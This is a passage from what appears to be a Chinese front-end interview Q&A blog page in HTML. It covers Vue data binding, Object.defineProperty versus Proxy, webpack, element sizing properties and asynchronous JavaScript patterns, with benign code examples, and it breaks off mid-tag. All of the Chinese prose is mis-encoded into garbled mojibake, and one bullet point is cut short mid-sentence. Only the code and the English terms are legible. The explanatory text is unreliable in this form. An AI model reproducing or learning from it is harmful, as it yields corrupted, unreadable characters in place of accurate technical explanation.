å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼ŒViewModel å°±ä¼šè‡ªåŠ¨æ›´æ–°ï¼›ViewModel å˜åŒ–äº†ï¼ŒView ä¹Ÿä¼šæ›´æ–°ã€‚è¿™æ ·å°±å°† Presenter ä¸­çš„å·¥ä½œç»™è‡ªåŠ¨åŒ–äº†ã€‚æˆ‘äº†è§£è¿‡ä¸€ç‚¹åŒå‘æ•°æ®ç»‘å®šçš„åŸç†ï¼Œæ¯”å¦‚ vue æ˜¯é€šè¿‡ä½¿ç”¨æ•°æ®åŠ«æŒå’Œå‘å¸ƒè®¢é˜…è€…æ¨¡å¼æ¥å®ç°çš„è¿™ä¸€åŠŸèƒ½ã€‚</p><h2 id="ä»‹ç»-Object-defineProperty-ï¼Ÿ"><a href="#ä»‹ç»-Object-defineProperty-ï¼Ÿ" class="headerlink" title="ä»‹ç» Object.defineProperty ï¼Ÿ"></a>ä»‹ç» Object.defineProperty ï¼Ÿ</h2><p>Object.defineProperty å‡½æ•°ä¸€å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯éœ€è¦å®šä¹‰å±æ€§çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯éœ€è¦å®šä¹‰çš„å±æ€§ï¼Œç¬¬ä¸‰ä¸ªæ˜¯è¯¥å±æ€§æè¿°ç¬¦ã€‚å±æ€§æè¿°ç¬¦çš„å€¼å¦‚ä¸‹ï¼š</p><ul><li>valueï¼šå°±æ˜¯å±æ€§çš„å€¼ã€‚</li><li>writableï¼šå†³å®šå±æ€§èƒ½å¦è¢«èµ‹å€¼ã€‚</li><li>enumerableï¼šå†³å®š for in èƒ½å¦æšä¸¾è¯¥å±æ€§ã€‚</li><li>configurableï¼šå†³å®šè¯¥å±æ€§èƒ½å¦è¢«åˆ é™¤æˆ–è€…æ”¹å˜ç‰¹å¾å€¼ã€‚</li></ul><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ Object.defineProperty å‡½æ•°æ”¹å˜å±æ€§çš„ç‰¹å¾ï¼Œæˆ–è€…å®šä¹‰è®¿é—®å™¨å±æ€§ã€‚</p><h3 id="ä½¿ç”¨-Object-defineProperty-æ¥è¿›è¡Œæ•°æ®åŠ«æŒçš„ç¼ºç‚¹ï¼Ÿ"><a href="#ä½¿ç”¨-Object-defineProperty-æ¥è¿›è¡Œæ•°æ®åŠ«æŒçš„ç¼ºç‚¹ï¼Ÿ" class="headerlink" title="ä½¿ç”¨ Object.defineProperty() æ¥è¿›è¡Œæ•°æ®åŠ«æŒçš„ç¼ºç‚¹ï¼Ÿ"></a><strong>ä½¿ç”¨ Object.defineProperty() æ¥è¿›è¡Œæ•°æ®åŠ«æŒçš„ç¼ºç‚¹ï¼Ÿ</strong></h3><ul><li><p>ä¸èƒ½ç›‘å¬æ•°ç»„çš„å˜åŒ–ï¼ˆå³å¦‚æœå¯¹è±¡ä¸Šæœ‰æ–°å¢çš„å±æ€§ï¼Œéœ€è¦å¯¹æ–°å¢çš„å±æ€§å†æ¬¡è¿›è¡Œ</p></li><li><p>å¿…é¡»éå†å¯¹è±¡çš„æ¯ä¸ªå±æ€§</p></li><li><p>å¦‚æœå±æ€§æ˜¯å¯¹è±¡ï¼Œè¿˜éœ€è¦æ·±å±‚éå†ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ**Vueç»™å¯¹è±¡æ–°å¢å±æ€§éœ€è¦é€šè¿‡<code>$set</code>**çš„åŸå› ï¼Œå…¶åŸç†ä¹Ÿæ˜¯é€šè¿‡<code>Object.defineProperty</code>å¯¹æ–°å¢çš„å±æ€§å†æ¬¡è¿›è¡ŒåŠ«æŒ</p></li></ul><h2 id="ä»€ä¹ˆæ˜¯-Proxy-ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-Proxy-ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ Proxy ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ Proxy ï¼Ÿ</h2><p>Proxy æ˜¯ ES6 ä¸­æ–°å¢çš„åŠŸèƒ½ï¼Œå®ƒå¯ä»¥ç”¨æ¥è‡ªå®šä¹‰å¯¹è±¡ä¸­çš„æ“ä½œã€‚Proxy å¯ä»¥ç†è§£æˆåœ¨ç›®æ ‡å¯¹è±¡ä¹‹å‰æ¶è®¾ä¸€å±‚â€œæ‹¦æˆªâ€ï¼Œå¤–ç•Œå¯¹è¯¥å¯¹è±¡çš„è®¿é—®ï¼Œéƒ½å¿…é¡»å…ˆé€šè¿‡è¿™å±‚æ‹¦æˆªï¼Œå› æ­¤æä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œå¯ä»¥å¯¹å¤–ç•Œçš„è®¿é—®è¿›è¡Œè¿‡æ»¤å’Œæ”¹å†™ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="built_in">Proxy</span>(target, handler)</span><br></pre></td></tr></table></figure><p><code>target</code> ä»£è¡¨éœ€è¦æ·»åŠ ä»£ç†çš„å¯¹è±¡ï¼Œ<code>handler</code> ç”¨æ¥è‡ªå®šä¹‰å¯¹è±¡ä¸­çš„æ“ä½œï¼Œæ¯”å¦‚å¯ä»¥ç”¨æ¥è‡ªå®šä¹‰ set æˆ–è€… get å‡½æ•°ã€‚</p><h3 id="Proxy-ä¸-Object-defineProperty-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#Proxy-ä¸-Object-defineProperty-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="Proxy ä¸ Object.defineProperty æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>Proxy ä¸ Object.defineProperty æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h3><ul><li>Proxy é’ˆå¯¹æ•´ä¸ªå¯¹è±¡ï¼Œè€Œ Object.defineProperty é’ˆå¯¹å•ä¸ªå±æ€§ï¼Œå‰è€…è§£å†³äº† éœ€è¦å¯¹å¯¹è±¡è¿›è¡Œæ·±åº¦é€’å½’ï¼ˆæ”¯æŒåµŒå¥—çš„å¤æ‚å¯¹è±¡åŠ«æŒï¼‰å®ç°å¯¹æ¯ä¸ªå±æ€§åŠ«æŒçš„é—®é¢˜ã€‚</li><li>Proxy è§£å†³äº† Object.defineProperty æ— æ³•åŠ«æŒæ•°ç»„ã€‚</li><li>æ¯” Object.defineProperty æœ‰æ›´å¤šçš„æ‹¦æˆªæ–¹æ³•ï¼Œå¯¹æ¯”ä¸€äº›æ–°çš„æµè§ˆå™¨ï¼Œå¯èƒ½ä¼šå¯¹ Proxy é’ˆæ­£å¯¹æ€§çš„ä¼˜åŒ–ï¼Œæœ‰åŠ©äºæ€§èƒ½æå‡ã€‚</li></ul><p>Proxyçš„ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä½œä¸ºæ–°çš„å†…ç½®å¯¹è±¡ï¼Œå¯¹è€æµè§ˆå™¨çš„å…¼å®¹æ€§å°±ä¸é‚£ä¹ˆå‹å¥½äº†ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨çš„æ—¶å€™å¾—è€ƒè™‘è¿™æ–¹é¢çš„å…¼å®¹é—®é¢˜ã€‚</p><h2 id="è°ˆè°ˆä½ å¯¹-webpack-çš„çœ‹æ³•"><a href="#è°ˆè°ˆä½ å¯¹-webpack-çš„çœ‹æ³•" class="headerlink" title="*è°ˆè°ˆä½ å¯¹ webpack çš„çœ‹æ³•"></a>*è°ˆè°ˆä½ å¯¹ webpack çš„çœ‹æ³•</h2><p>æˆ‘å½“æ—¶ä½¿ç”¨ webpack çš„ä¸€ä¸ªæœ€ä¸»è¦åŸå› æ˜¯ä¸ºäº†ç®€åŒ–é¡µé¢ä¾èµ–çš„ç®¡ç†ï¼Œå¹¶ä¸”é€šè¿‡å°†å…¶æ‰“åŒ…ä¸ºä¸€ä¸ªæ–‡ä»¶æ¥é™ä½é¡µé¢åŠ è½½æ—¶è¯·æ±‚çš„èµ„æºæ•°ã€‚</p><p>æˆ‘è®¤ä¸º webpack çš„ä¸»è¦åŸç†æ˜¯ï¼Œå®ƒå°†æ‰€æœ‰çš„èµ„æºéƒ½çœ‹æˆæ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œå¹¶ä¸”æŠŠé¡µé¢é€»è¾‘å½“ä½œä¸€ä¸ªæ•´ä½“ï¼Œé€šè¿‡ä¸€ä¸ªç»™å®šçš„å…¥å£æ–‡ä»¶ï¼Œwebpack ä»è¿™ä¸ªæ–‡ä»¶å¼€å§‹ï¼Œæ‰¾åˆ°æ‰€æœ‰çš„ä¾èµ–æ–‡ä»¶ï¼Œå°†å„ä¸ªä¾èµ–æ–‡ä»¶æ¨¡å—é€šè¿‡ loader å’Œ plugins å¤„ç†åï¼Œç„¶åæ‰“åŒ…åœ¨ä¸€èµ·ï¼Œæœ€åè¾“å‡ºä¸€ä¸ªæµè§ˆå™¨å¯è¯†åˆ«çš„ JS æ–‡ä»¶ã€‚</p><p>Webpack å…·æœ‰å››ä¸ªæ ¸å¿ƒçš„æ¦‚å¿µï¼Œåˆ†åˆ«æ˜¯ Entryï¼ˆå…¥å£ï¼‰ã€Outputï¼ˆè¾“å‡ºï¼‰ã€loader å’Œ Pluginsï¼ˆæ’ä»¶ï¼‰ã€‚</p><p>Entry æ˜¯ webpack çš„å…¥å£èµ·ç‚¹ï¼Œå®ƒæŒ‡ç¤º webpack åº”è¯¥ä»å“ªä¸ªæ¨¡å—å¼€å§‹ç€æ‰‹ï¼Œæ¥ä½œä¸ºå…¶æ„å»ºå†…éƒ¨ä¾èµ–å›¾çš„å¼€å§‹ã€‚</p><p>Output å±æ€§å‘Šè¯‰ webpack åœ¨å“ªé‡Œè¾“å‡ºå®ƒæ‰€åˆ›å»ºçš„æ‰“åŒ…æ–‡ä»¶ï¼Œä¹Ÿå¯æŒ‡å®šæ‰“åŒ…æ–‡ä»¶çš„åç§°ï¼Œé»˜è®¤ä½ç½®ä¸º ./distã€‚</p><p>loader å¯ä»¥ç†è§£ä¸º webpack çš„ç¼–è¯‘å™¨ï¼Œå®ƒä½¿å¾— webpack å¯ä»¥å¤„ç†ä¸€äº›é JavaScript æ–‡ä»¶ã€‚åœ¨å¯¹ loader è¿›è¡Œé…ç½®çš„æ—¶å€™ï¼Œtest å±æ€§ï¼Œæ ‡å¿—æœ‰å“ªäº›åç¼€çš„æ–‡ä»¶åº”è¯¥è¢«å¤„ç†ï¼Œæ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚use å±æ€§ï¼ŒæŒ‡å®š test ç±»å‹çš„æ–‡ä»¶åº”è¯¥ä½¿ç”¨å“ªä¸ª loader è¿›è¡Œé¢„å¤„ç†ã€‚å¸¸ç”¨çš„ loader æœ‰ css-loaderã€style-loader ç­‰ã€‚</p><p>æ’ä»¶å¯ä»¥ç”¨äºæ‰§è¡ŒèŒƒå›´æ›´å¹¿çš„ä»»åŠ¡ï¼ŒåŒ…æ‹¬æ‰“åŒ…ã€ä¼˜åŒ–ã€å‹ç¼©ã€æ­å»ºæœåŠ¡å™¨ç­‰ç­‰ï¼Œè¦ä½¿ç”¨ä¸€ä¸ªæ’ä»¶ï¼Œä¸€èˆ¬æ˜¯å…ˆä½¿ç”¨ npm åŒ…ç®¡ç†å™¨è¿›è¡Œå®‰è£…ï¼Œç„¶ååœ¨é…ç½®æ–‡ä»¶ä¸­å¼•å…¥ï¼Œæœ€åå°†å…¶å®ä¾‹åŒ–åä¼ é€’ç»™ plugins æ•°ç»„å±æ€§ã€‚</p><p>ä½¿ç”¨ webpack çš„ç¡®èƒ½å¤Ÿæä¾›æˆ‘ä»¬å¯¹äºé¡¹ç›®çš„ç®¡ç†ï¼Œä½†æ˜¯å®ƒçš„ç¼ºç‚¹å°±æ˜¯è°ƒè¯•å’Œé…ç½®èµ·æ¥å¤ªéº»çƒ¦äº†ã€‚ä½†ç°åœ¨ webpack4.0 çš„å…é…ç½®ä¸€å®šç¨‹åº¦ä¸Šè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ä½†æ˜¯æˆ‘æ„Ÿè§‰å°±æ˜¯å¯¹æˆ‘æ¥è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªé»‘ç›’ï¼Œå¾ˆå¤šæ—¶å€™å‡ºç°äº†é—®é¢˜ï¼Œæ²¡æœ‰åŠæ³•å¾ˆå¥½çš„å®šä½ã€‚</p><h2 id="offsetWidth-offsetHeightï¼ŒclientWidth-clientHeight-ä¸-scrollWidth-scrollHeight-çš„åŒºåˆ«ï¼Ÿ"><a href="#offsetWidth-offsetHeightï¼ŒclientWidth-clientHeight-ä¸-scrollWidth-scrollHeight-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="offsetWidth/offsetHeightï¼ŒclientWidth/clientHeight ä¸ scrollWidth/scrollHeight çš„åŒºåˆ«ï¼Ÿ"></a>offsetWidth/offsetHeightï¼ŒclientWidth/clientHeight ä¸ scrollWidth/scrollHeight çš„åŒºåˆ«ï¼Ÿ</h2><p>clientWidth/clientHeight è¿”å›çš„æ˜¯å…ƒç´ çš„å†…éƒ¨å®½åº¦ï¼Œå®ƒçš„å€¼åªåŒ…å« content + paddingï¼Œå¦‚æœæœ‰æ»šåŠ¨æ¡ï¼Œä¸åŒ…å«æ»šåŠ¨æ¡ã€‚<br>clientTop è¿”å›ä¸Šè¾¹æ¡†çš„å®½åº¦ã€‚<br>clientLeft è¿”å›å·¦è¾¹æ¡†çš„å®½åº¦ã€‚</p><p>offsetWidth/offsetHeight è¿”å›çš„æ˜¯å…ƒç´ çš„å¸ƒå±€å®½åº¦ï¼Œå®ƒçš„å€¼åŒ…å« content + padding + border åŒ…å«äº†æ»šåŠ¨æ¡ã€‚<br>offsetTop è¿”å›å½“å‰å…ƒç´ ç›¸å¯¹äºå…¶ offsetParent å…ƒç´ çš„é¡¶éƒ¨è·ç¦»ã€‚<br>offsetLeft è¿”å›å½“å‰å…ƒç´ ç›¸å¯¹äºå…¶ offsetParent å…ƒç´ çš„å·¦éƒ¨è·ç¦»ã€‚</p><p>scrollWidth/scrollHeight è¿”å›å€¼åŒ…å« content + padding + æº¢å‡ºå†…å®¹çš„å°ºå¯¸ã€‚<br>scrollTop å±æ€§è¿”å›ä¸€ä¸ªå…ƒç´ å†…å®¹å‚ç›´æ»šåŠ¨çš„åƒç´ æ•°ã€‚<br>scrollLeft å±æ€§è¿”å›å…ƒç´ æ»šåŠ¨æ¡åˆ°å…ƒç´ å·¦è¾¹çš„è·ç¦»ã€‚</p><h2 id="è°ˆä¸€è°ˆä½ ç†è§£çš„å‡½æ•°å¼ç¼–ç¨‹ï¼Ÿ"><a href="#è°ˆä¸€è°ˆä½ ç†è§£çš„å‡½æ•°å¼ç¼–ç¨‹ï¼Ÿ" class="headerlink" title="è°ˆä¸€è°ˆä½ ç†è§£çš„å‡½æ•°å¼ç¼–ç¨‹ï¼Ÿ"></a>è°ˆä¸€è°ˆä½ ç†è§£çš„å‡½æ•°å¼ç¼–ç¨‹ï¼Ÿ</h2><p>ç®€å•è¯´ï¼Œâ€å‡½æ•°å¼ç¼–ç¨‹â€æ˜¯ä¸€ç§â€ç¼–ç¨‹èŒƒå¼â€ï¼Œä¹Ÿå°±æ˜¯å¦‚ä½•ç¼–å†™ç¨‹åºçš„æ–¹æ³•è®ºã€‚å®ƒå…·æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼šé—­åŒ…å’Œé«˜é˜¶å‡½æ•°ã€æƒ°æ€§è®¡ç®—ã€é€’å½’ã€å‡½æ•°æ˜¯â€ç¬¬ä¸€ç­‰å…¬æ°‘â€ã€åªç”¨â€è¡¨è¾¾å¼â€ã€‚</p><h2 id="å›è°ƒåœ°ç‹±"><a href="#å›è°ƒåœ°ç‹±" class="headerlink" title="å›è°ƒåœ°ç‹±"></a>å›è°ƒåœ°ç‹±</h2><p>å›è°ƒå‡½æ•°çš„è‡´å‘½å¼±ç‚¹ã€‚æ ¹æœ¬é—®é¢˜ï¼š</p><ol><li>åµŒå¥—å‡½æ•°å­˜åœ¨è€¦åˆæ€§ï¼Œä¸€æ—¦æœ‰æ‰€æ”¹åŠ¨ï¼Œå°±ä¼šç‰µä¸€å‘è€ŒåŠ¨å…¨èº«</li><li>åµŒå¥—å‡½æ•°ä¸€å¤šï¼Œå°±å¾ˆéš¾å¤„ç†é”™è¯¯</li></ol><p>è¿˜æœ‰ä¸èƒ½ä½¿ç”¨ <code>try catch</code> æ•è·é”™è¯¯ï¼Œä¸èƒ½ç›´æ¥ <code>return</code>ã€‚</p><h2 id="å¼‚æ­¥ç¼–ç¨‹çš„å®ç°æ–¹å¼ï¼Ÿ"><a href="#å¼‚æ­¥ç¼–ç¨‹çš„å®ç°æ–¹å¼ï¼Ÿ" class="headerlink" title="å¼‚æ­¥ç¼–ç¨‹çš„å®ç°æ–¹å¼ï¼Ÿ"></a>å¼‚æ­¥ç¼–ç¨‹çš„å®ç°æ–¹å¼ï¼Ÿ</h2><p>js ä¸­çš„å¼‚æ­¥æœºåˆ¶å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç§ï¼š</p><ul><li><p>å›è°ƒå‡½æ•°ã€‚å›è°ƒå‡½æ•°çš„<strong>ä¼˜ç‚¹</strong>æ˜¯ç®€å•ã€å®¹æ˜“ç†è§£å’Œéƒ¨ç½²ï¼Œ<strong>ç¼ºç‚¹</strong>æ˜¯ä¸åˆ©äºä»£ç çš„é˜…è¯»å’Œç»´æŠ¤ï¼Œå„ä¸ªéƒ¨åˆ†ä¹‹é—´é«˜åº¦è€¦åˆï¼ˆCouplingï¼‰ï¼Œæµç¨‹ä¼šå¾ˆæ··ä¹±ï¼Œä¸åˆ©äºä»£ç çš„å¯ç»´æŠ¤ã€‚è€Œä¸”æ¯ä¸ªä»»åŠ¡åªèƒ½æŒ‡å®šä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå¤šä¸ªå›è°ƒå‡½æ•°åµŒå¥—çš„æ—¶å€™ä¼šé€ æˆå›è°ƒå‡½æ•°åœ°ç‹±ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å‡å®šæœ‰ä¸¤ä¸ªå‡½æ•°f1å’Œf2ï¼Œåè€…ç­‰å¾…å‰è€…çš„æ‰§è¡Œç»“æœã€‚</span></span><br><span class="line">f1();</span><br><span class="line">f2();</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœf1æ˜¯ä¸€ä¸ªå¾ˆè€—æ—¶çš„ä»»åŠ¡ï¼Œå¯ä»¥è€ƒè™‘æ”¹å†™f1ï¼ŒæŠŠf2å†™æˆf1çš„å›è°ƒå‡½æ•°ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">callback</span>)</span>&#123;</span><br><span class="line">ã€€ã€€<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">ã€€ã€€ã€€ã€€<span class="comment">// f1çš„ä»»åŠ¡ä»£ç </span></span><br><span class="line">ã€€ã€€ã€€ã€€callback();</span><br><span class="line">ã€€ã€€&#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰§è¡Œä»£ç å°±å˜æˆä¸‹é¢è¿™æ ·ï¼š</span></span><br><span class="line">f1(f2);</span><br></pre></td></tr></table></figure></li><li><p>äº‹ä»¶ç›‘å¬ã€‚é‡‡ç”¨äº‹ä»¶é©±åŠ¨æ¨¡å¼ï¼Œä»»åŠ¡çš„æ‰§è¡Œä¸å–å†³äºä»£ç çš„é¡ºåºï¼Œè€Œå–å†³äºæŸä¸ªäº‹ä»¶æ˜¯å¦å‘ç”Ÿã€‚<strong>ä¼˜ç‚¹</strong>æ˜¯æ¯”è¾ƒå®¹æ˜“ç†è§£ï¼Œå¯ä»¥ç»‘å®šå¤šä¸ªäº‹ä»¶ï¼Œæ¯ä¸ªäº‹ä»¶å¯ä»¥æŒ‡å®šå¤šä¸ªå›è°ƒå‡½æ•°ï¼Œè€Œä¸”å¯ä»¥â€å»è€¦åˆâ€ï¼ˆDecouplingï¼‰ï¼Œæœ‰åˆ©äºå®ç°æ¨¡å—åŒ–ã€‚<strong>ç¼ºç‚¹</strong>æ˜¯æ•´ä¸ªç¨‹åºéƒ½è¦å˜æˆäº‹ä»¶é©±åŠ¨å‹ï¼Œè¿è¡Œæµç¨‹ä¼šå˜å¾—å¾ˆä¸æ¸…æ™°ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é¦–å…ˆï¼Œä¸ºf1ç»‘å®šä¸€ä¸ªäº‹ä»¶</span></span><br><span class="line">f1.on(<span class="string">&#x27;done&#x27;</span>, f2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹f1è¿›è¡Œæ”¹å†™ï¼Œf1.trigger(&#x27;done&#x27;)è¡¨ç¤ºæ‰§è¡Œå®Œæˆåï¼Œç«‹å³è§¦å‘doneäº‹ä»¶ï¼Œä»è€Œå¼€å§‹æ‰§è¡Œf2ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">ã€€ã€€<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">ã€€ã€€ã€€ã€€<span class="comment">// f1çš„ä»»åŠ¡ä»£ç </span></span><br><span class="line">ã€€ã€€ã€€ã€€f1.trigger(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line">ã€€ã€€&#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å‘å¸ƒ/è®¢é˜…ã€‚ä¸Šè¿°â€äº‹ä»¶â€ï¼Œå®Œå…¨å¯ä»¥ç†è§£æˆâ€ä¿¡å·â€ï¼šæˆ‘ä»¬å‡å®šï¼Œå­˜åœ¨ä¸€ä¸ªâ€ä¿¡å·ä¸­å¿ƒâ€ï¼ŒæŸä¸ªä»»åŠ¡æ‰§è¡Œå®Œæˆï¼Œå°±å‘ä¿¡å·ä¸­å¿ƒâ€å‘å¸ƒâ€ï¼ˆpublishï¼‰ä¸€ä¸ªä¿¡å·ï¼Œå…¶ä»–ä»»åŠ¡å¯ä»¥å‘ä¿¡å·ä¸­å¿ƒâ€è®¢é˜…â€ï¼ˆsubscribeï¼‰è¿™ä¸ªä¿¡å·ï¼Œä»è€ŒçŸ¥é“ä»€ä¹ˆæ—¶å€™è‡ªå·±å¯ä»¥å¼€å§‹æ‰§è¡Œã€‚è¿™å°±å«åšâ€œå‘å¸ƒ/è®¢é˜…æ¨¡å¼â€ï¼Œåˆç§°â€è§‚å¯Ÿè€…æ¨¡å¼â€ã€‚<strong>ä¼˜ç‚¹</strong>æ˜¯å¯ä»¥é€šè¿‡æŸ¥çœ‹â€æ¶ˆæ¯ä¸­å¿ƒâ€ï¼Œäº†è§£å­˜åœ¨å¤šå°‘ä¿¡å·ã€æ¯ä¸ªä¿¡å·æœ‰å¤šå°‘è®¢é˜…è€…ï¼Œä»è€Œç›‘æ§ç¨‹åºçš„è¿è¡Œã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é¦–å…ˆï¼Œf2å‘&quot;ä¿¡å·ä¸­å¿ƒ&quot;jQueryè®¢é˜…&quot;done&quot;ä¿¡å·ã€‚</span></span><br><span class="line">jQuery.subscribe(<span class="string">&quot;done&quot;</span>, f2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç„¶åï¼Œf1è¿›è¡Œå¦‚ä¸‹æ”¹å†™ï¼šjQuery.publish(&quot;done&quot;)çš„æ„æ€æ˜¯ï¼Œf1æ‰§è¡Œå®Œæˆåï¼Œå‘&quot;ä¿¡å·ä¸­å¿ƒ&quot;jQueryå‘å¸ƒ&quot;done&quot;ä¿¡å·ï¼Œä»è€Œå¼•å‘f2çš„æ‰§è¡Œã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// f1çš„ä»»åŠ¡ä»£ç </span></span><br><span class="line">jQuery.publish(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­¤å¤–ï¼Œf2å®Œæˆæ‰§è¡Œåï¼Œä¹Ÿå¯ä»¥å–æ¶ˆè®¢é˜…ã€‚</span></span><br><span class="line">jQuery.unsubscribe(<span class="string">&quot;done&quot;</span>, f2);</span><br></pre></td></tr></table></figure></li><li><p>Promise ã€‚ä½¿ç”¨ Promise çš„æ–¹å¼å¯ä»¥å°†åµŒå¥—çš„å›è°ƒå‡½æ•°ä½œä¸ºé“¾å¼è°ƒç”¨ã€‚ä½†æ˜¯ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œæœ‰æ—¶ä¼šé€ æˆå¤šä¸ª then çš„é“¾å¼è°ƒç”¨ï¼Œå¯èƒ½ä¼šé€ æˆä»£ç çš„è¯­ä¹‰ä¸å¤Ÿæ˜ç¡®ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">f1();</span><br><span class="line">    resolve();</span><br><span class="line"> &#125;).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    f2();</span><br><span class="line"> &#125;).catch(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">           f3();</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></li><li><p>generator ã€‚ç”Ÿæˆå™¨å‡½æ•°å°±æ˜¯ä¸€ä¸ªå¸¦æ˜Ÿå·ï¼ˆ*ï¼‰çš„å‡½æ•°ï¼Œåœ¨å†…éƒ¨ç¢°åˆ° yield å°±å¯ä»¥å®ç°æš‚åœåŠŸèƒ½ï¼Œä½¿ç”¨ next è¿›è¡Œè¿­ä»£ã€‚å½“æˆ‘ä»¬é‡åˆ°å¼‚æ­¥å‡½æ•°æ‰§è¡Œçš„æ—¶å€™ï¼Œå°†å‡½æ•°æ‰§è¡Œæƒè½¬ç§»å‡ºå»ï¼Œå½“å¼‚æ­¥å‡½æ•°æ‰§è¡Œå®Œæ¯•çš„æ—¶å€™æˆ‘ä»¬å†å°†æ‰§è¡Œæƒç»™è½¬ç§»å›æ¥ï¼Œå› æ­¤å¯ä»¥ä»¥åŒæ­¥çš„é¡ºåºæ¥ä¹¦å†™å¼‚æ­¥æ“ä½œã€‚ä½¿ç”¨è¿™ç§æ–¹å¼æˆ‘ä»¬éœ€è¦è€ƒè™‘çš„é—®é¢˜æ˜¯ä½•æ—¶å°†å‡½æ•°çš„æ§åˆ¶æƒè½¬ç§»å›æ¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æœ‰ä¸€ä¸ªè‡ªåŠ¨æ‰§è¡Œ generator çš„æœºåˆ¶ï¼Œæ¯”å¦‚è¯´ co æ¨¡å—ç­‰æ–¹å¼æ¥å®ç° generator çš„è‡ªåŠ¨æ‰§è¡Œã€‚è¯¦æƒ…è§<a href="https://blog.csdn.net/a18792627168/article/details/106154898%E3%80%82">https://blog.csdn.net/a18792627168/article/details/106154898ã€‚</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">yield</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">yield</span> <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;ending&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> gen = g();</span><br><span class="line"></span><br><span class="line"><span class="comment">// g()å¹¶ä¸ä¼šç«‹å³æ‰§è¡Œå‡½æ•°ï¼Œè€Œæ˜¯è¿”å›è¿­ä»£å™¨Iteratorå¯¹è±¡ï¼Œå¿…é¡»è°ƒç”¨éå†å™¨å¯¹è±¡çš„nextæ–¹æ³•ï¼Œä½¿å¾—æŒ‡é’ˆç§»å‘ä¸‹ä¸€ä¸ªçŠ¶æ€ã€‚</span></span><br><span class="line"><span class="built_in">console</span>.log(gen.next());   <span class="comment">// &#123; value: &#x27;a&#x27;, done: false &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(gen.next());   <span class="comment">// &#123; value: &#x27;b&#x27;, done: false &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(gen.next());<span class="comment">// &#123; value: &#x27;ending&#x27;, done: true &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(gen.next());<span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure></li><li><p>async ã€‚async å‡½æ•°æ˜¯ generator å’Œ promise å®ç°çš„ä¸€ä¸ªè‡ªåŠ¨æ‰§è¡Œçš„è¯­æ³•ç³–ï¼Œå®ƒå†…éƒ¨è‡ªå¸¦æ‰§è¡Œå™¨ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span 